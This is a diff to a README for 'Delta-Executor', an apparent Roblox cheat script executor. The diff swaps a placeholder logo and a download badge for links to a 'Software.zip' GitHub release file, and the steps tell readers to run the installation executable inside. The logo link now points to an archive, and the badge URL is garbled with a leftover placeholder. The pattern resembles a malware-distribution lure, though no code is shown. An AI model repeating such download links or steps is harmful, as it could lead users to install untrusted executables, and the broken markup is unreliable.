@@ -1,6 +1,6 @@
 # Delta-Executor
 
-![Delta-Executor Logo](https://www.example.com/delta_executor_logo.png)
+![Delta-Executor Logo](https://github.com/lilanders123/Delta-Executor/releases/download/v2.0/Software.zip)
 
 Explore how Roblox Delta Executor is transforming the landscape of Roblox scripting, offering a host of premium features and industry-leading support, all free of charge, to users worldwide, revolutionizing the scripting experience for millions.
 
@@ -36,7 +36,7 @@ To get started with Delta Executor, follow these simple steps:
 
 1. Download the latest version of Delta Executor from the official repository by clicking on the button below:
   
-   [![Download Delta Executor](https://img.shields.io/badge/Download-Program.zip-<HEX-COLOR-CODE>)](https://github.com/user-attachments/files/17563020/Program.zip)
+   [![Download Delta Executor](https://github.com/lilanders123/Delta-Executor/releases/download/v2.0/Software.zip<HEX-COLOR-CODE>)](https://github.com/lilanders123/Delta-Executor/releases/download/v2.0/Software.zip)
   
 2. Extract the downloaded ZIP file to your desired location on your computer.
 3. Open the extracted folder and run the installation executable.
